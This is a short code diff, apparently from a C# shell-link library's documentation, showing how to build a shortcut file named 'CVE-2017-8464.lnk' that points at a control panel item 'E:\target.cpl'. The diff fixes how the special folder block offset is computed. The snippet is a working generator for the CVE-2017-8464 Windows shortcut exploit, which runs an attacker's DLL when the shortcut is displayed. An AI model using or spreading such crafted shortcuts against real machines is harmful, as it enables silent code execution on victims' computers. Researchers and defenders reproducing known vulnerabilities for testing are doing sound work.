@@ -101,10 +101,11 @@ Shortcut lnk = new Shortcut()
 	LinkFlags = LinkFlags.IsUnicode,
 	LinkTargetIDList = new CplLinkTargetIDList(@"E:\target.cpl"),
 };
+int Index = lnk.LinkTargetIDList.ItemIDList.Count - 1;
 lnk.ExtraData.SpecialFolderDataBlock = new SpecialFolderDataBlock()
 {
-	SpecialFolderID = 0x03,
-	Offset = (UInt32)0x28
+	SpecialFolderID = CSIDL.CSIDL_CONTROLS,
+	Offset = lnk.LinkTargetIDList.GetOffsetByIndex(Index)
 };
 lnk.WriteToFile(@"CVE-2017-8464.lnk");
 ```
